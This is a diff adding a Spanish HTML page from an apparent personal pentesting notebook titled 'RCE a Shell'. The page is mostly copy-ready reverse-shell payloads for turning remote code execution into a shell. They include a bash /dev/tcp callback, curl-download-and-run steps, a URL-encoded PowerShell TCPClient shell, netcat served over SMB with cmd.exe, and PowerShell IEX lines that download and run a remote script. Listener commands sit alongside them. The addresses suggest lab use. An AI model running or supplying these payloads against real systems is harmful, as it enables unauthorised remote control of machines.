@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RCE a Shell | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="rce-a-shell">
+          <div class="note-tabbar">
+            <span>RCE a Shell</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Shells</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">shells</p>
+            <h2>RCE a Shell</h2>
+
+            <h3>Linux</h3>
+            <section class="code-card">
+              <h3>Archivo: bash.sh</h3>
+              <pre><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.16.178/443 0&gt;&amp;1</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Reverse Shell</h3>
+              <pre><code># Listener puerto 443
+# Hostear bash.sh
+&quot;curl http://10.10.16.178/bash.sh -o /tmp/bash.sh&quot;
+&quot;chmod +x /tmp/bash.sh&quot;
+&quot;bash /tmp/bash.sh&quot;</code></pre>
+            </section>
+            <p><a href="/notebook/shells/pentestmonkey.html">PentestMonkey</a></p>
+            <h3>Windows</h3>
+            <h3>ONE LINER POWERSHELL</h3>
+            <section class="code-card">
+              <h3>RCE Windows a Shell: Sustituir IP_KALI y PUERTO y pegar en RCE</h3>
+              <pre><code>powershell%20-nop%20-c%20%22$client%20=%20New-Object%20System.Net.Sockets.TCPClient(%27&lt;IP_KALI&gt;%27,&lt;PUERTO&gt;);$stream%20=%20$client.GetStream();[byte[]]$bytes%20=%200..65535|%{0};while(($i%20=%20$stream.Read($bytes,%200,%20$bytes.Length))%20-ne%200){;$data%20=%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes,0,%20$i);$sendback%20=%20(iex%20$data%202%3E&amp;1%20|%20Out-String%20);$sendback2%20=%20$sendback%20+%20%27PS%20%27%20+%20(pwd).Path%20+%20%27%3E%20%27;$sendbyte%20=%20([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()%22</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>RCE Windows a Shell: Sustituir IP_KALI y PUERTO y pegar en RCE</h3>
+              <pre><code>powershell%20-nop%20-c%20%22$client%20=%20New-Object%20System.Net.Sockets.TCPClient(%2710.10.16.69%27,443);$stream%20=%20$client.GetStream();[byte[]]$bytes%20=%200..65535|%{0};while(($i%20=%20$stream.Read($bytes,%200,%20$bytes.Length))%20-ne%200){;$data%20=%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes,0,%20$i);$sendback%20=%20(iex%20$data%202%3E&amp;1%20|%20Out-String%20);$sendback2%20=%20$sendback%20+%20%27PS%20%27%20+%20(pwd).Path%20+%20%27%3E%20%27;$sendbyte%20=%20([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()%22</code></pre>
+            </section>
+            <h3>SMB y NetCat</h3>
+            <section class="code-card">
+              <h3>Kali: Copiar y Compartir por SMB nc.exe</h3>
+              <pre><code># Hostear nc.exe
+impacket-smbserver recurso $(pwd) -smb2support</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Listener </h3>
+              <pre><code>sudo nc -nlvp 443</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Web RCE: Ejecutar nc.exe</h3>
+              <pre><code>\\&lt;kali_ip&gt;\smb\\nc.exe -e cmd.exe &lt;kali_ip&gt; 443
+
+# URL ENCODE
+%5c%5c10.10.16.69%5csmb%5c%5cnc.exe%20%2de%20cmd.exe 10.10.16.69%20443</code></pre>
+            </section>
+            <h3>PowerShell</h3>
+            <section class="code-card">
+              <h3>Hostear Invoke-PowerShellTcp.ps1</h3>
+              <pre><code># Retocar IP y Port del Script
+python -m http.server 80</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Listener</h3>
+              <pre><code>penelope -p 443</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Ejecutar Rev_Shell</h3>
+              <pre><code># Payload 1
+powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.16.69/Invoke-PowerShellTcp.ps1&#x27;)
+# Payload 2
+powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.16.69/Invoke-PowerShellTcp.ps1&#x27;)&quot;
+# Payload 3
+&quot;powershell -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.16.69/Invoke-PowerShellTcp.ps1&#x27;)&quot;&quot;
+# Payload 4
+&quot;powershell -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.16.69/Invoke-PowerShellTcp.ps1&#x27;)&quot;&quot;</code></pre>
+            </section>
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>rce_a_shell_windows</span>
+              <span>reverse_shells</span>
+              <span>rce_a_shell_linux</span>
+              <span>shells</span>
+              <span>rce_a_shell</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
